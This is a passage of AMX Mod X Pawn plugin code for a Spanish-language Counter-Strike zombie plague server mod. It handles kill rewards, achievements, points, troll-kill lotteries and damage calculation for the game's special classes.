	g_isalive[victim] = false
	gPlayerSolid[victim] = 0
	gPlayerRestore[victim] = 0
	
	// Enable dead players nightvision
	if( !gArmageddonRound )
		set_task(0.1, "spec_nvision", victim)
	
	// Stop bleeding/burning/aura when killed
	if (g_zombie[victim])
	{
		remove_task(victim+TASK_BLOOD)
		remove_task(victim+TASK_AURA)
		remove_task(victim+TASK_BURN)
		
		if(gLogro_ElZombieNoDie[victim])
			gLogro_ElZombieNoDie[victim] = 0;
		
		gLogro_ZombieDie[victim]++;
	}
	
	// Nemesis/Troll explodes!
	if (g_nemesis[victim] || gTroll[victim])
		SetHamParamInteger(3, 2)
	
	// Get deathmatch mode status and whether the player killed himself
	static selfkill
	selfkill = (victim == attacker || !is_user_valid_connected(attacker)) ? true : false
	
	// Killed by a non-player entity or self killed
	if (selfkill) return;
	
	// Respawn as zombie?
	if( fnGetZombies() < (fnGetAlive()/2) )
		g_respawn_as_zombie[victim] = true
	
	// Set the respawn task
	set_task(3.0, "respawn_player_task", victim+TASK_SPAWN)
	
	gKills[attacker]++
	gLogro_CountKill[attacker]++;
	gKillsRec[victim]++
	
	if(gKills[attacker] >= 20000 && !g_logro[attacker][LOGRO_HUMAN][KILL_100000])
	{
		fnUpdateLogros(attacker, LOGRO_HUMAN, KILL_20000)
		
		if(gKills[attacker] >= 50000)
		{
			fnUpdateLogros(attacker, LOGRO_HUMAN, KILL_50000)
			
			if(gKills[attacker] >= 100000)
			{
				fnUpdateLogros(attacker, LOGRO_HUMAN, KILL_100000)
			}
		}
	}
	
	// Zombie/nemesis killed human, reward ammo packs
	if (g_zombie[attacker])
	{
		UpdateAps(attacker, gTH_Mult[attacker][0]*3, 0, 1)
		UpdateFrags(attacker, victim, 0, 0, 0)
	}
	
	if( gJason[attacker] && g_currentweapon[attacker] == CSW_KNIFE && g_zombie[victim] )
		SetHamParamInteger(3, 2)
	
	// Human killed zombie, add up the extra frags for kill
	if (!g_zombie[attacker])
	{
		UpdateFrags(attacker, victim, 0, 0, 0)
		if(!g_nemesis[victim] && !gTroll[victim])
		{
			if(g_currentweapon[attacker] == CSW_KNIFE && !gJason[attacker])
				fnUpdateLogros(attacker, LOGRO_HUMAN, A_CUCHILLO)
		}
	}
	
	// Zombie/nemesis killed special CTs, reward point
	if( g_zombie[attacker] && ( g_survivor[victim] || gPlayersL4D[victim][0] || gPlayersL4D[victim][1] || gPlayersL4D[victim][2] ||
	gPlayersL4D[victim][3] || gWesker[victim] || gJason[victim] || gSniper[victim] ) )
	{
		gPoints[attacker][HAB_ZOMBIE] += gTH_Mult[attacker][1]
		
		if( !gArmageddonRound )
		{
			new sz_TextVictim[64];
			if(g_survivor[victim]) formatex(sz_TextVictim, charsmax(sz_TextVictim), "un survivor")
			else if(gPlayersL4D[victim][0]) formatex(sz_TextVictim, charsmax(sz_TextVictim), "a BILL")
			else if(gPlayersL4D[victim][1]) formatex(sz_TextVictim, charsmax(sz_TextVictim), "a FRANCIS")
			else if(gPlayersL4D[victim][2]) formatex(sz_TextVictim, charsmax(sz_TextVictim), "a ZOEY")
			else if(gPlayersL4D[victim][3]) formatex(sz_TextVictim, charsmax(sz_TextVictim), "a LUIS")
			else if(gWesker[victim]) formatex(sz_TextVictim, charsmax(sz_TextVictim), "un wesker")
			else if(gJason[victim]) formatex(sz_TextVictim, charsmax(sz_TextVictim), "un jason")
			else if(gSniper[victim])
			{
				if(g_currentweapon[victim] == CSW_AWP) formatex(sz_TextVictim, charsmax(sz_TextVictim), "un sniper")
				else if(g_currentweapon[victim] == CSW_SCOUT) formatex(sz_TextVictim, charsmax(sz_TextVictim), "un scouter")
				else formatex(sz_TextVictim, charsmax(sz_TextVictim), "un Sniper/Scouter")
			}
			
			CC( 0, "!g[ZP] %s!y ganó !g%dp%s. zombie%s!y por haber matado %s", g_playername[attacker], gTH_Mult[attacker][1],
			gTH_Mult[attacker][1] != 1 ? "ts" : "", gTH_Mult[attacker][1] != 1 ? "s" : "", sz_TextVictim )
		}
		else
			CC( attacker, "!g[ZP]!y Ganaste !g%dp%s. zombie%s!y por haber matado un survivor", gTH_Mult[attacker][1], gTH_Mult[attacker][1] != 1 ? "ts" : "", gTH_Mult[attacker][1] != 1 ? "s" : "" )
			
		// Armageddon - Nemesis win's
		if( gArmageddonRound && g_survivor[victim] && !fnGetSurvivors() )
		{
			for( new i = 1; i <= g_maxplayers; i++ )
			{
				if( g_nemesis[i] && g_isalive[i] )
				{
					gPoints[i][HAB_ZOMBIE] += 2
					gPoints[i][HAB_NEMESIS]++
				}
			}
			
			CC( 0, "!g[ZP]!y Los nemesis que quedaron vivos ganaron !g2pts. zombies!y y !g1p. nemesis!y por haber ganado el armageddon")
		}
	}
	// Special CTs killed nemesis, reward point
	else if( g_nemesis[victim] )
	{
		gPoints[attacker][HAB_HUMAN] += gTH_Mult[attacker][1]
		
		if( gJason[attacker] || g_currentweapon[attacker] != CSW_KNIFE )
		{
			if( !gArmageddonRound )
				CC( 0, "!g[ZP] %s!y ganó !g%dp%s. humano%s!y por haber matado un nemesis", g_playername[attacker], gTH_Mult[attacker][1], gTH_Mult[attacker][1] != 1 ? "ts" : "", gTH_Mult[attacker][1] != 1 ? "s" : "" )
			else
				CC( attacker, "!g[ZP]!y Ganaste !g%dp%s. humano%s!y por haber matado un nemesis", gTH_Mult[attacker][1], gTH_Mult[attacker][1] != 1 ? "ts" : "", gTH_Mult[attacker][1] != 1 ? "s" : "" )
		}
		else
		{
			gPoints[attacker][HAB_HUMAN] += 2
			gPoints[attacker][HAB_NEMESIS]++
			CC( 0, "!g[ZP] %s!y ganó !g%dpts. humanos!y y !g1p. nemesis!y por haber matado un nemesis con cuchillo", g_playername[attacker], gTH_Mult[attacker][1]+2 )
			
			fnUpdateLogros(attacker, LOGRO_HUMAN, AFILANDO_CUCHILLOS)
		}
		
		// Armageddon - Survivor win's
		if( gArmageddonRound && !fnGetNemesis() )
		{
			for( new i = 1; i <= g_maxplayers; i++ )
			{
				if( g_survivor[i] && g_isalive[i] )
				{
					gPoints[i][HAB_HUMAN] += 2
					gPoints[i][HAB_SURVIVOR]++
				}
			}
			
			CC( 0, "!g[ZP]!y Los survivors que quedaron vivos ganaron !g2pts. humanos!y y !g1p. survivor!y por haber ganado el armageddon")
		}
	}
	
	// Nemesis win's ?
	if( g_nemround && g_nemesis[attacker] && g_lasthuman[victim] )
	{
		gPoints[attacker][HAB_ZOMBIE] += gTH_Mult[attacker][1]
		gPoints[attacker][HAB_NEMESIS]++;
		CC( 0, "!g[ZP] %s!y ganó !g%dp%s. zombie%s!y y !g1p. nemesis!y por haber matado a todos siendo nemesis", g_playername[attacker], gTH_Mult[attacker][1], gTH_Mult[attacker][1] != 1 ? "ts" : "", gTH_Mult[attacker][1] != 1 ? "s" : "" )
	}
	// Sniper win's ?
	else if( gSniperRound && gSniper[attacker] && g_lastzombie[victim] )
	{
		for( new i = 1; i <= g_maxplayers; i++ )
		{
			if( gSniper[i] && g_isalive[i] )
			{
				gPoints[i][HAB_HUMAN] += 2
				gPoints[i][HAB_SURVIVOR]++
			}
		}
		
		CC( 0, "!g[ZP]!y Los snipers/scouters que quedaron vivos ganaron !g2pts humanos!y y !g1p. survivor!y por haber ganado el modo sniper")
	}
	// Survivor/Wesker/Ninja win's ?
	else if( g_survivor[attacker] && g_survround && g_lastzombie[victim])
	{
		gPoints[attacker][HAB_HUMAN] += gTH_Mult[attacker][1]
		gPoints[attacker][HAB_SURVIVOR]++;
		CC( 0, "!g[ZP] %s!y ganó !g%dp%s. humano%s!y y !g1p. survivor!y por haber matado a todos siendo survivor", g_playername[attacker], gTH_Mult[attacker][1], gTH_Mult[attacker][1] != 1 ? "ts" : "", gTH_Mult[attacker][1] != 1 ? "s" : "" )
	}
	else if(gWesker[attacker] && gWeskerRound && g_lastzombie[victim])
	{
		gPoints[attacker][HAB_HUMAN] += gTH_Mult[attacker][1]
		CC( 0, "!g[ZP] %s!y ganó !g%dp%s. humano%s!y por haber matado a todos siendo wesker", g_playername[attacker], gTH_Mult[attacker][1], gTH_Mult[attacker][1] != 1 ? "ts" : "", gTH_Mult[attacker][1] != 1 ? "s" : "" )
	}
	else if(gJason[attacker] && gJasonRound && g_lastzombie[victim])
	{
		gPoints[attacker][HAB_HUMAN] += gTH_Mult[attacker][1]
		CC( 0, "!g[ZP] %s!y ganó !g%dp%s. humano%s!y por haber matado a todos siendo jason", g_playername[attacker], gTH_Mult[attacker][1], gTH_Mult[attacker][1] != 1 ? "ts" : "", gTH_Mult[attacker][1] != 1 ? "s" : "" )
	}
	
	// Special CTs killed troll, reward recompense
	if( gTroll[victim] )
	{
		if(!gGananciaAcomodada)
		{
			if( g_currentweapon[attacker] == CSW_KNIFE )
			{
				new iVarSinNombre = random_num(0, 999)
				CC( 0, "!g[ZP] %s!y ganó una apuesta de lotería de !g30.000 APs!y al !gnúmero %d!y", g_playername[attacker], iVarSinNombre )
				CC( 0, "!g[ZP]!y Si ya habías apostado esta semana, esta apuesta es una extra. !gDOBLE CHANCE!!y" )
				
				SQL_QueryAndIgnore( SQL_CONNECTION, "UPDATE `accounts` SET `cant_apostada` = '30000', `num_apostado` = '%d' WHERE `id` = '%d';", iVarSinNombre, zp_id[attacker] )
			}
			else
			{
				new iRandomNumber = random_num(0, 100)
				
				switch( iRandomNumber )
				{
					case 0..35:
					{
						new iRandomRoundNumber = random_num(12345, 25431)
						new sAddDotRRN[15]; AddDot(iRandomRoundNumber, sAddDotRRN, 14)
						
						CC( 0, "!g[ZP] %s!y ganó !g%s ammopacks!y por haber matado al troll", g_playername[attacker], sAddDotRRN )
						
						UpdateAps(attacker, iRandomRoundNumber, 0, 1)
					}
					case 36..45:
					{
						CC( 0, "!g[ZP] %s!y ganó !g5 puntos humanos y zombies!y por haber matado al troll", g_playername[attacker] )
					
						gPoints[attacker][HAB_HUMAN] += 5
						gPoints[attacker][HAB_ZOMBIE] += 5
					}
					case 46..65:
					{
						new iRandomRoundNumber = random_num(0, 1)
						
						if(iRandomRoundNumber)
						{
							CC( 0, "!g[ZP] %s!y ganó !g5 puntos humanos!y por haber matado al troll", g_playername[attacker] )
							gPoints[attacker][HAB_HUMAN] += 5
						}
						else
						{
							CC( 0, "!g[ZP] %s!y ganó !g5 puntos zombies!y por haber matado al troll", g_playername[attacker] )
							gPoints[attacker][HAB_ZOMBIE] += 5
						}
					}
					case 66..95:
					{
						new iRandomRoundNumber = random_num(12345, 25431)
						new sAddDotRRN[15]; AddDot(iRandomRoundNumber, sAddDotRRN, 14)
						
						CC( 0, "!g[ZP] %s!y ganó !g%s ammopacks!y por haber matado al troll", g_playername[attacker], sAddDotRRN )
						
						UpdateAps(attacker, iRandomRoundNumber, 0, 1)
					}
					case 96..99:
					{
						CC( 0, "!g[ZP] %s!y ganó !g2 puntos survivor y nemesis!y por haber matado al troll", g_playername[attacker] )
					
						gPoints[attacker][HAB_SURVIVOR] += 2
						gPoints[attacker][HAB_NEMESIS] += 2
					}
					case 100:
					{
						new iRandomRoundNumber = random_num(12345, 25431)
						new sAddDotRRN[15]; AddDot(iRandomRoundNumber, sAddDotRRN, 14)
						new iAddDotAPSNeed;
						
						switch(gReset[attacker])
						{
							case 0: iAddDotAPSNeed = gAMMOPACKS_NEEDED[gLevel[attacker]] - g_ammopacks[attacker]
							case 1: iAddDotAPSNeed = gAMMOPACKS_NEEDED_RESET(gLevel[attacker]) - g_ammopacks[attacker]
							case 2..3: iAddDotAPSNeed = gAMMOPACKS_NEEDED_RESET_2(gLevel[attacker]) - g_ammopacks[attacker]
							case 4..9999: iAddDotAPSNeed = gAMMOPACKS_NEEDED_RESET_4(gLevel[attacker]) - g_ammopacks[attacker]
						}
						
						CC( 0, "!g[ZP] %s!y ganó !g%s APs!y, !g5p. H y Z!y, !g2p. S y N!y y !g1 nivel!y", g_playername[attacker], sAddDotRRN )
						
						gPoints[attacker][HAB_HUMAN] += 5
						gPoints[attacker][HAB_ZOMBIE] += 5
						gPoints[attacker][HAB_SURVIVOR] += 2
						gPoints[attacker][HAB_NEMESIS] += 2
						
						UpdateAps(attacker, iAddDotAPSNeed, 0, 1)
						UpdateAps(attacker, iRandomRoundNumber, 0, 1)
					}
				}
			}
		}
		else
		{
			switch(gGananciaAcomodada)
			{
				case 1:
				{
					new iRandomRoundNumber = random_num(12345, 25431)
					new sAddDotRRN[15]; AddDot(iRandomRoundNumber, sAddDotRRN, 14)
					
					CC( 0, "!g[ZP] %s!y ganó !g%s ammopacks!y por haber matado al troll", g_playername[attacker], sAddDotRRN )
					
					UpdateAps(attacker, iRandomRoundNumber, 0, 1)
				}
				case 2:
				{
					CC( 0, "!g[ZP] %s!y ganó !g5 puntos humanos y zombies!y por haber matado al troll", g_playername[attacker] )
				
					gPoints[attacker][HAB_HUMAN] += 5
					gPoints[attacker][HAB_ZOMBIE] += 5
				}
				case 3:
				{
					new iRandomRoundNumber = random_num(0, 1)
					
					if(iRandomRoundNumber)
					{
						CC( 0, "!g[ZP] %s!y ganó !g5 puntos humanos!y por haber matado al troll", g_playername[attacker] )
						gPoints[attacker][HAB_HUMAN] += 5
					}
					else
					{
						CC( 0, "!g[ZP] %s!y ganó !g5 puntos zombies!y por haber matado al troll", g_playername[attacker] )
						gPoints[attacker][HAB_ZOMBIE] += 5
					}
				}
				case 4:
				{
					CC( 0, "!g[ZP] %s!y ganó !g2 puntos survivor y nemesis!y por haber matado al troll", g_playername[attacker] )
				
					gPoints[attacker][HAB_SURVIVOR] += 2
					gPoints[attacker][HAB_NEMESIS] += 2
				}
				case 5:
				{
					new iRandomRoundNumber = random_num(12345, 25431)
					new sAddDotRRN[15]; AddDot(iRandomRoundNumber, sAddDotRRN, 14)
					new iAddDotAPSNeed;
					
					switch(gReset[attacker])
					{
						case 0: iAddDotAPSNeed = gAMMOPACKS_NEEDED[gLevel[attacker]] - g_ammopacks[attacker]
						case 1: iAddDotAPSNeed = gAMMOPACKS_NEEDED_RESET(gLevel[attacker]) - g_ammopacks[attacker]
						case 2..3: iAddDotAPSNeed = gAMMOPACKS_NEEDED_RESET_2(gLevel[attacker]) - g_ammopacks[attacker]
						case 4..9999: iAddDotAPSNeed = gAMMOPACKS_NEEDED_RESET_4(gLevel[attacker]) - g_ammopacks[attacker]
					}
					
					CC( 0, "!g[ZP] %s!y ganó !g%s APs!y, !g5p. H y Z!y, !g2p. S y N!y y !g1 nivel!y", g_playername[attacker], sAddDotRRN )
					
					gPoints[attacker][HAB_HUMAN] += 5
					gPoints[attacker][HAB_ZOMBIE] += 5
					gPoints[attacker][HAB_SURVIVOR] += 2
					gPoints[attacker][HAB_NEMESIS] += 2
					
					UpdateAps(attacker, iAddDotAPSNeed, 0, 1)
					UpdateAps(attacker, iRandomRoundNumber, 0, 1)
				}
				case 6:
				{
					new iVarSinNombre = random_num(0, 999)
					CC( 0, "!g[ZP] %s!y ganó una apuesta de lotería de !g30.000 APs!y al !gnúmero %d!y", g_playername[attacker], iVarSinNombre )
					CC( 0, "!g[ZP]!y Si ya habías apostado esta semana, esta apuesta es una extra. !gDOBLE CHANCE!!y" )
					
					SQL_QueryAndIgnore( SQL_CONNECTION, "UPDATE `accounts` SET `cant_apostada` = '30000', `num_apostado` = '%d' WHERE `id` = '%d';", iVarSinNombre, zp_id[attacker] )
				}
			}
		}
	}
	
	if( gTroll[attacker] && !g_zombie[victim] )
		SetHamParamInteger(3, 2)
	
	if( gTrollRound && gTroll[attacker] && g_lasthuman[victim] )
	{
		new iRandomRoundNumber = random_num(15000, 25000)
		new sAddDotRRN[15]; AddDot(iRandomRoundNumber, sAddDotRRN, 14)
		
		CC( 0, "!g[ZP] %s!y ganó !g%s ammopacks!y por haber matado a todos siendo troll", g_playername[attacker], sAddDotRRN )
		
		UpdateAps(attacker, iRandomRoundNumber, 0, 1)
	}
	
	// COMPLETAR - MODO L4D
}

// Ham Player Killed Post Forward
public fw_PlayerKilled_Post()
{
	// Last Zombie Check
	fnCheckLastZombie()
}

// Ham Take Damage Forward
public fw_TakeDamage(victim, inflictor, attacker, Float:damage, damage_type)
{
	// Dmg fall ?
	if( damage_type & DMG_FALL )
	{
		damage *= 0.0
		SetHamParamFloat( 4, damage )
		return HAM_SUPERCEDE;
	}
	
	// Non-player damage or self damage
	if (victim == attacker || !is_user_valid_connected(attacker))
		return HAM_IGNORED;
	
	// New round starting or round ended
	if (g_newround || g_endround)
		return HAM_SUPERCEDE;
	
	// Fix bubble problem in armageddon
	if(gArmageddonRound)
	{
		if(g_nodamage[victim] && g_nemesis[attacker])
			return HAM_SUPERCEDE;
	}
	
	// Fix bubble problem
	if (g_nodamage[victim] && g_nodamage[attacker] && !g_zombie[attacker])
		return HAM_SUPERCEDE;
		
	// Victim shouldn't take damage or victim is frozen
	if ((g_nodamage[victim] && !g_nodamage[attacker] && !g_nemesis[attacker] && !gTroll[attacker]) || g_frozen[victim] == 1)
		return HAM_SUPERCEDE;
	
	// Prevent friendly fire
	if (g_zombie[attacker] == g_zombie[victim])
		return HAM_SUPERCEDE;
		
	// Prevent infect when zombie frozen
	if (g_zombie[attacker] && g_frozen[attacker] > 0)
		return HAM_SUPERCEDE;
	
	// Fix problem with shut knife zombie
	if(g_zombie[attacker])
	{
		if(!fm_is_ent_visible(attacker, victim))
			return HAM_SUPERCEDE;
	}
	
	// Attacker is human...
	if (!g_zombie[attacker])
	{
		// Wesker attacker
		if( gWesker[attacker] && g_currentweapon[attacker] == CSW_DEAGLE )
		{
			new HealthTotal = get_user_health(victim)
			
			// Sacando el 30% de la vida de la victima. Ese sera el daño que hara.
			HealthTotal *= 20
			HealthTotal /= 100
			
			damage = float(HealthTotal < 20.0) ? 20.0 : float(HealthTotal)
			
			if(gTroll[victim]) damage /= 100.0
			
			SetHamParamFloat(4, damage)
		}
		
		// Ninja attacker
		if( gJason[attacker] && g_currentweapon[attacker] == CSW_KNIFE )
		{
			if( get_user_button(attacker) & IN_ATTACK )  
			{	
				damage = random_float( 888.0, 1111.0 )
				if(gTroll[victim]) damage /= 100.0
				SetHamParamFloat(4, damage)
			}
			else if( get_user_button(attacker) & IN_ATTACK2 )
			{
				damage = random_float( 1666.0, 2444.0 )
				if(gTroll[victim]) damage /= 100.0
				SetHamParamFloat(4, damage)
			}
			
			a_lot_of_blood(victim)
		}
		
		// Sniper attacker
		if( gSniper[attacker] )
		{
			if( g_currentweapon[attacker] == CSW_AWP ) damage *= 8.0
			else if( g_currentweapon[attacker] == CSW_SCOUT ) damage *= 3.0
			
			if(gTroll[victim]) damage /= 100.0
			
			SetHamParamFloat(4, damage)
		}
		
		if( !gWesker[attacker] && !gJason[attacker] && !gSniper[attacker] )
		{
			if( gWeaponsEdit[attacker][ARMA_PRIMARIA] )
			{
				if( gPrimaryWeapon[attacker] == 1 )
				{
					if( gWeapon[attacker][ARMA_PRIMARIA][M3] || gWeapon[attacker][ARMA_PRIMARIA][MP5_NAVY] || gWeapon[attacker][ARMA_PRIMARIA][COLT] || 
					gWeapon[attacker][ARMA_PRIMARIA][AK47] || gWeapon[attacker][ARMA_PRIMARIA][TMP] || gWeapon[attacker][ARMA_PRIMARIA][AUG] || 
					gWeapon[attacker][ARMA_PRIMARIA][SG550] || gWeapon[attacker][ARMA_PRIMARIA][XM1014] || gWeapon[attacker][ARMA_PRIMARIA][M249] )
					{
						if( DamageWeaponPower[g_currentweapon[attacker]] >= 1.0 )
							damage *= DamageWeaponPower[g_currentweapon[attacker]]
					}
					else if( gWeapon[attacker][ARMA_PRIMARIA][M3_2] || gWeapon[attacker][ARMA_PRIMARIA][MP5_NAVY_2] || gWeapon[attacker][ARMA_PRIMARIA][AK47_2] ||
					gWeapon[attacker][ARMA_PRIMARIA][COLT_2] )
					{
						if( DamageWeaponPower_2[g_currentweapon[attacker]] >= 1.0 )
							damage *= DamageWeaponPower_2[g_currentweapon[attacker]]
					}
				}
			}
			else if( gWeaponsEdit[attacker][ARMA_SECUNDARIA] )
			{
				if( gPrimaryWeapon[attacker] == 0 )
				{
					if( gWeapon[attacker][ARMA_SECUNDARIA][GLOCK] || gWeapon[attacker][ARMA_SECUNDARIA][USP] || gWeapon[attacker][ARMA_SECUNDARIA][P228] || 
					gWeapon[attacker][ARMA_SECUNDARIA][FIVESEVEN] || gWeapon[attacker][ARMA_SECUNDARIA][ELITE] || gWeapon[attacker][ARMA_SECUNDARIA][DEAGLE] )
					{
						if( DamageWeaponPower[g_currentweapon[attacker]] >= 1.0 )
							damage *= DamageWeaponPower[g_currentweapon[attacker]]
					}
					else if( gWeapon[attacker][ARMA_SECUNDARIA][GLOCK_2] || gWeapon[attacker][ARMA_SECUNDARIA][USP_2] || gWeapon[attacker][ARMA_SECUNDARIA][P228_2] || 
					gWeapon[attacker][ARMA_SECUNDARIA][FIVESEVEN_2] || gWeapon[attacker][ARMA_SECUNDARIA][ELITE_2] || gWeapon[attacker][ARMA_SECUNDARIA][DEAGLE_2] )
					{
						if( DamageWeaponPower_2[g_currentweapon[attacker]] >= 1.0 )
							damage *= DamageWeaponPower_2[g_currentweapon[attacker]]
					}
				}
			}
			
			g_human_dmg[attacker] = ammount_upgradeF(attacker, HAB_HUMAN, HUMAN_DAMAGE, Float:ArrayGetCell(g_hclass_dmg, g_humanclass[attacker]))
			damage += g_human_dmg[attacker]
			
			if(gTroll[victim])
			{
				if(damage / 100.0 <= 1.0) damage = 1.0
				else damage /= 100.0
			}
			
			if( g_frozen[victim] == 2 ) SetHamParamFloat(4, damage/2.0)
			else SetHamParamFloat(4, damage)
		}
		
		if( g_frozen[victim] == 2 )
		{
			gDmgEcho[attacker] += floatround(damage)/2
			gDmgRec[victim] += floatround(damage)/2
			
			gLogro_CountDmg[attacker] += floatround(damage)/2
		}
		else 
		{
			gDmgEcho[attacker] += floatround(damage)
			gDmgRec[victim] += floatround(damage)
			
			gLogro_CountDmg[attacker] += floatround(damage)
		}
		
		// Reward ammo packs
		// Store damage dealt
		g_damagedealt[attacker] += floatround(damage)
		
		// Reward ammo packs for every [ammo damage] dealt
		new ammodamage = (475 / gTH_Mult[attacker][0])
		while (g_damagedealt[attacker] > ammodamage)
		{
			UpdateAps(attacker, gTH_Mult[attacker][0], 0, 1)
			g_damagedealt[attacker] -= ammodamage
		}
		
		// Combo system
		if( (gWesker[attacker] && !g_hab[attacker][HAB_SPECIAL][WESKER_COMBO_ENABLED]) || (gJason[attacker] && !g_hab[attacker][HAB_SPECIAL][JASON_COMBO_ENABLED]) || gSniper[attacker] )
			return HAM_IGNORED;
		
		static iUp, iDamage;
		iDamage = floatround(damage)
		gDamageCombo[attacker] += iDamage
		
		while( gDamageCombo[attacker] >= ( gAMMOUNT_DMG( gCombo[attacker] ) ) / gTH_Mult[attacker][0] )
		{
			gCombo[attacker]++
			iUp = 1
		}
		
		if( iUp )
		{
			if(gCombo[attacker] >= 0 && gCombo[attacker] < 50) gComboMultiplier[attacker] = 0
			else if(gCombo[attacker] >= 50 && gCombo[attacker] < 150) gComboMultiplier[attacker] = 1
			else if(gCombo[attacker] >= 150 && gCombo[attacker] < 250) gComboMultiplier[attacker] = 2
			else if(gCombo[attacker] >= 250 && gCombo[attacker] < 500) gComboMultiplier[attacker] = 3
			else if(gCombo[attacker] >= 500 && gCombo[attacker] < 800) gComboMultiplier[attacker] = 4
			else if(gCombo[attacker] >= 800) gComboMultiplier[attacker] = 5
			
			static szCombo[15]; AddDot(gCombo[attacker], szCombo, 14)
			formatex( gInfoCombo[attacker], 127, "¡ Combo de %s ammopacks !", szCombo )
			
			remove_task( attacker + TASK_INFOCOMBO )
			set_task( (g_hab[attacker][HAB_SPECIAL][COMBOLANDIA]) ? 6.5 : 5.0, "InformacionCombo", attacker + TASK_INFOCOMBO )
			
			ShowCurrentCombo(attacker, floatround(damage))
		}
		
		remove_task( attacker + TASK_FINISHCOMBO )
		set_task( (g_hab[attacker][HAB_SPECIAL][COMBOLANDIA]) ? 6.5 : 5.0, "FinishCombo", attacker + TASK_FINISHCOMBO )
		
		return HAM_IGNORED;
	}
	
	// Attacker is zombie...
	
	// Prevent infection/damage by HE grenade (bugfix)
	if (damage_type & DMG_HEGRENADE)
		return HAM_SUPERCEDE;
	
	// Last human or not an infection round
	if (g_survround || g_nemround || gTrollRound || g_swarmround || g_plagueround || gSynapsisRound || gArmageddonRound || gL4DRound ||
	gWeskerRound || gJasonRound || gSniperRound || gTaringaRound || fnGetHumans() == 1 || gJason[victim] || gWesker[victim] || gSniper[victim] || g_survivor[victim])
	{
		// Zombie & Nemesis/Troll?
		if( g_zombie[attacker] )
		{
			if (g_nemesis[attacker])
			{
				// Ignore nemesis damage override if damage comes from a 3rd party entity
				// (to prevent this from affecting a sub-plugin's rockets e.g.)
				if (inflictor == attacker)
				{
					// Set nemesis damage
					if( get_user_button( attacker ) & IN_ATTACK ) damage = 100.0
					else if( get_user_button( attacker ) & IN_ATTACK2 ) damage = 250.0
					
					SetHamParamFloat(4, damage)
					
					gDmgEcho[attacker] += floatround(damage)
					gDmgRec[victim] += floatround(damage)
				}
			}
			else if( gTroll[attacker] )
			{
				if( get_user_button( attacker ) & IN_ATTACK ) SetHamParamFloat(4, 150.0)
				else if( get_user_button( attacker ) & IN_ATTACK2 ) ExecuteHamB(Ham_Killed, victim, attacker, 2)
			}
			else
			{
				// Set zombie damage affected with the stats
				/*g_zombie_dmg[attacker] = ammount_upgradeF(attacker, HAB_ZOMBIE, ZOMBIE_DAMAGE, float(ArrayGetCell(g_zclass_dmg, g_zombieclass[attacker])))
				damage = g_zombie_dmg[attacker]*/
				SetHamParamFloat(4, damage)
				
				gDmgEcho[attacker] += floatround(damage)
				gDmgRec[victim] += floatround(damage)
			}
		}
		
		return HAM_IGNORED; // human is killed
	}
	
	// Get victim armor
	static armor
	armor = get_user_armor(victim)
	
	// Block the attack if he has some
	if (armor > 0 && !g_firstzombie[attacker])
	{
		// Get percent damage
		emit_sound(victim, CHAN_BODY, sound_armorhit, 1.0, ATTN_NORM, 0, PITCH_NORM)
		set_user_armor(victim, max(0, armor - floatround(damage)))
		return HAM_SUPERCEDE;
	}
	
	// Infection allowed
	zombieme(victim, attacker, 0, 0, 1, 0) // turn into zombie
	return HAM_SUPERCEDE;
}

// Ham Take Damage Post Forward
public fw_TakeDamage_Post(victim)
{
	// --- Check if victim should be Pain Shock Free ---
	
	// Check if proper CVARs are enabled
	if (g_zombie[victim])
	{
		if (g_nemesis[victim]) return;
		else if (!g_lastzombie[victim]) return;
	}
	else
	{
		if (!g_survivor[victim] && !gPlayersL4D[victim][0] && !gPlayersL4D[victim][1] && !gPlayersL4D[victim][2] && !gPlayersL4D[victim][3] && !gWesker[victim] &&
		!gJason[victim] && !gSniper[victim])
			return;
	}
	
	// Set pain shock free offset
	set_pdata_float(victim, OFFSET_PAINSHOCK, 1.0, OFFSET_LINUX)
}

// Ham Trace Attack Forward
public fw_TraceAttack(victim, attacker, Float:damage, Float:direction[3], tracehandle, damage_type)
{
	// Non-player damage or self damage
	if (victim == attacker || !is_user_valid_connected(attacker))
		return HAM_IGNORED;
	
	// New round starting or round ended
	if (g_newround || g_endround)
		return HAM_SUPERCEDE;
	
	// Fix bubble problem in armageddon
	if(gArmageddonRound)
	{
		if(g_nodamage[victim] && g_nemesis[attacker])
			return HAM_SUPERCEDE;
	}
	
	// Fix bubble problem
	if (g_nodamage[victim] && g_nodamage[attacker] && !g_zombie[attacker])
		return HAM_SUPERCEDE;
		
	// Victim shouldn't take damage or victim is frozen
	if ((g_nodamage[victim] && !g_nodamage[attacker] && !g_nemesis[attacker] && !gTroll[attacker]) || g_frozen[victim] == 1)
		return HAM_SUPERCEDE;
	
	// Prevent friendly fire
	if (g_zombie[attacker] == g_zombie[victim])
		return HAM_SUPERCEDE;
	
	// Prevent infect when zombie frozen
	if (g_zombie[attacker] && g_frozen[attacker] > 0)
		return HAM_SUPERCEDE;
	
	// Victim isn't a zombie or not bullet damage, nothing else to do here
	if (!g_zombie[victim] || !(damage_type & DMG_BULLET))
		return HAM_IGNORED;
	
	// If zombie hitzones are enabled, check whether we hit an allowed one
	/*if (get_pcvar_num(cvar_hitzones) && !g_nemesis[victim] && !(get_pcvar_num(cvar_hitzones) & (1<<get_tr2(tracehandle, TR_iHitgroup))))
		return HAM_SUPERCEDE;*/
	
	// Knockback disabled, nothing else to do here
	return HAM_IGNORED;
}

// Ham Use Stationary Gun Forward
public fw_UseStationary(entity, caller, activator, use_type)
{
	// Prevent zombies from using stationary guns
	if (use_type == USE_USING && is_user_valid_connected(caller) && g_zombie[caller])
		return HAM_SUPERCEDE;
	
	return HAM_IGNORED;
}

// Ham Use Stationary Gun Post Forward
public fw_UseStationary_Post(entity, caller, activator, use_type)
{
	// Someone stopped using a stationary gun
	if (use_type == USE_STOPPED && is_user_valid_connected(caller))
		replace_weapon_models(caller, g_currentweapon[caller]) // replace weapon models (bugfix)
}

// Ham Use Pushable Forward
public fw_UsePushable()
{
	// Prevent speed bug with pushables?
	return HAM_IGNORED;
}

// Ham Weapon Touch Forward
public fw_TouchWeapon(weapon, id)
{
	// Not a player
	if (!is_user_valid_connected(id))
		return HAM_IGNORED;
	
	// Dont pickup weapons if zombie or survivor (+PODBot MM fix)
	if (g_zombie[id] || ((g_survivor[id] || gPlayersL4D[id][0] || gPlayersL4D[id][1] || gPlayersL4D[id][2] || gPlayersL4D[id][3] || gWesker[id] || gJason[id] ||
	gSniper[id])))
		return HAM_SUPERCEDE;
	
	return HAM_IGNORED;
}

// Ham Weapon Pickup Forward
public fw_AddPlayerItem(id, weapon_ent)
{
	// HACK: Retrieve our custom extra ammo from the weapon
	static extra_ammo
	extra_ammo = pev(weapon_ent, PEV_ADDITIONAL_AMMO)
	
	// If present
	if (extra_ammo)
	{
		// Get weapon's id
